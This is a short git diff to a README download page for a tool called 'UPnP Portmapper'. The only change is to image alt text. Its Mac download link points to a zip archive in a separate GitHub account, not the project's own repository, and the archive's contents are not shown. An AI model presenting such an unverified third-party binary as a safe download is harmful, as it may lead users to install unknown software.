@@ -1,7 +1,7 @@
 # UPnP Portmapper
 ![UPnP Portmapper](https://github.com/upnpportmapper/download/blob/main/images/tool.jpeg?raw=true)
 ## UPnP Portmapper Download
-[![Portmapper Windows](https://github.com/upnpportmapper/download/blob/main/images/windows.png?raw=true)](https://apps.microsoft.com/detail/9PBT9LKW4Z7B)  |  [![Portmapper Mac](https://github.com/upnpportmapper/download/blob/main/images/mac.png?raw=true)](https://github.com/appdownloads/software/raw/main/upnp-portmapper-mac.zip)
+[![UPnP Portmapper Windows](https://github.com/upnpportmapper/download/blob/main/images/windows.png?raw=true)](https://apps.microsoft.com/detail/9PBT9LKW4Z7B)  |  [![UPnP Portmapper Mac](https://github.com/upnpportmapper/download/blob/main/images/mac.png?raw=true)](https://github.com/appdownloads/software/raw/main/upnp-portmapper-mac.zip)
 :-------------------------:|:-------------------------:
 [Windows](https://apps.microsoft.com/detail/9PBT9LKW4Z7B)             |  [Mac](https://github.com/appdownloads/software/raw/main/upnp-portmapper-mac.zip)
 ### Features
